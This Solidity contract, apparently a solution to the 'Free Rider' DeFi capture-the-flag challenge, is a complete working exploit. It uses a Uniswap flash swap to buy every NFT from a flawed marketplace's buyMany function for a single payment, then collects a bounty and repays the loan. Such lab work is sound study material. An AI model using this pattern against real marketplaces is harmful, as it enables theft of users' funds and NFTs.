// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

interface IMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;

    function amountOfOffers() external returns (uint256);
}

contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {
    uint256 constant PRICE_PER_TOKEN = 15 ether;

    IUniswapV2Pair _pair;
    IWETH _weth;

    address _buyer;
    IMarket _market;
    IERC721 _nft;

    address _owner;

    constructor(
        IUniswapV2Pair pair_,
        IWETH weth_,
        address buyer_,
        IMarket market_,
        IERC721 nft_
    ) {
        _pair = pair_;
        _weth = weth_;
        _buyer = buyer_;
        _market = market_;
        _nft = nft_;
        _owner = msg.sender;
        
    }

    function attack() external {
        uint256 amount0Out = address(_weth) == _pair.token0()
            ? PRICE_PER_TOKEN
            : 0;
        uint256 amount1Out = address(_weth) == _pair.token1()
            ? PRICE_PER_TOKEN
            : 0;

        bytes memory data = abi.encode(address(_weth), PRICE_PER_TOKEN);

        _pair.swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        //(address token, uint256 amount) = abi.decode(data, (address, uint256));

        uint256 fee = ((PRICE_PER_TOKEN * 3) / 997) + 1;
        uint256 repayAmount = PRICE_PER_TOKEN + fee;

        // we got our WETH, lets unwrap it and buy all NFTS
        _weth.withdraw(PRICE_PER_TOKEN);

        uint256 tokensCount = _market.amountOfOffers();
        _market.buyMany{value: PRICE_PER_TOKEN}(_getTokens(tokensCount));

        // Got our NFTs lets transfer them to the buyer
        _transferTokens(tokensCount);

        // now we should have our bounty, lets wrap repayAmount and return it to the uniswap
        require(address(this).balance > 15 ether, "!balance");
        _weth.deposit{value: repayAmount}();
        _weth.transfer(address(_pair), repayAmount);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        console.log("Got tokenId =", _tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }

    function _getTokens(uint256 n) private pure returns (uint256[] memory) {
        uint256[] memory result = new uint256[](n);
        for (uint256 i = 0; i < n; i++) result[i] = i;
        return result;
    }

    function _transferTokens(uint256 n) private {
        for (uint256 i = 0; i < n; i++) {
            _nft.safeTransferFrom(address(this), _buyer, i);
        }
    }

    receive() external payable {}
}
